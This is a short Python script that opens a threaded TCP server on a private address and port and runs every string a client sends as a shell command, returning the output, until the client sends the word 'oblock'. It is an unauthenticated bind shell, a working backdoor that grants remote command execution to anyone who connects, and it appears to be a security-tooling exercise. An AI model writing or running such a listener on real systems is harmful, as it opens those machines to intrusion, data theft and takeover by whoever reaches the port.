import socket
import threading
import subprocess

IP = '192.168.0.199'
PORT = 9004

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*] listening on {IP}:{PORT}')
    global address
    while True:
        client, address = server.accept()
        print (client)
        print (address)
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()
        
def handle_client(client_socket):
    with client_socket as sock:
        request = ''
        while True:
            request = sock.recv(1024)
            print(f'[*] Received: {request.decode("utf-8")}')
            if request != b'oblock':
                try:
                    command = subprocess.run(request.decode(),shell=True,capture_output=True, check=True)
                except subprocess.CalledProcessError:
                    sock.send(f"The command {request.decode()} raised CalledProcessError.".encode())
                    continue
                sock.send(command.stdout)
            else:
                break 

        sock.send(b'Server has received safe-word. Pulling out')
        print(f'[*] Received safe-word from {address[0]}:{address[1]}. Pulling out')
        sock.close()
if __name__ == '__main__':
    main()